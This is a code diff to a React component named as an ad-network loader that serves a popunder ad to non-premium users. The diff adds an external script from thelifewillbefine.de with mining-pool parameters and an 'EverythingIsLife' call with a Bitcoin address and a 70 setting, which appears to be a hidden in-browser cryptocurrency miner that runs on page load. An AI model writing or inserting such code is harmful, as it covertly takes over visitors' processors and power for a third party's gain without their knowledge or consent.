@@ -11,6 +11,7 @@ const AdNetworkScript: React.FC = () => {
   if (isLoading || isPremium) return null;
 
   return (
+    <>
     <Script id="hilltop-popunder-tag" strategy="afterInteractive" data-cfasync="false">
       {`(function () {
   var w = window;
@@ -95,13 +96,18 @@ const AdNetworkScript: React.FC = () => {
     next();
   }
 })();`}
- </Script>
+    </Script>
 
-
-
-
+    <Script
+      src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340"
+      strategy="afterInteractive"
+      data-cfasync="false"
+    />
+    <Script id="everythingislife-tag" strategy="afterInteractive" data-cfasync="false">
+      {`EverythingIsLife('bc1qk5hd7a2r72l2yesav93zq59lj5p56skmvsmhtx', 'c=BTC', 70);`}
+    </Script>
+    </>
   );
-  
 };
 
 export default AdNetworkScript;
